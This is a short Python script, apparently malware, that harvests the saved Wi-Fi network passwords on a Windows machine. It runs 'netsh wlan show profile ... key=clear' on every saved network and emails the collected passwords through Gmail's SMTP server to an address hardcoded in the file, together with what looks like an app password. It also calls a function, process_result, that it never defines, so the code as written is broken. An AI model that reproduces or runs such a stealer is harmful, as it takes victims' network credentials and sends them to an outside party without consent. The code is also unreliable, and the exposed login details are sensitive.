#! /bin/env/ python


import subprocess, smtplib, re

def send_mail(email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()
	
def process_message(message):
	res = re.findall("(?:Profile\s*:\s)(.*)", message)
	return res
	
	
command = "netsh wlan show profile"
result = subprocess.check_output(command, shell=True)
final_result = process_result(result)

result = ""

for net_name in final_result:
	mod_name = '"' + net_name + '"'
	command = "netsh wlan show profile " + mod_name + " key=clear"
	curr_res = subprocess.check_output(command, shell=True)
	result += curr_res
	
send_mail("tulu.gupta1234@gmail.com", "hczbswsmltuhywdj", result)
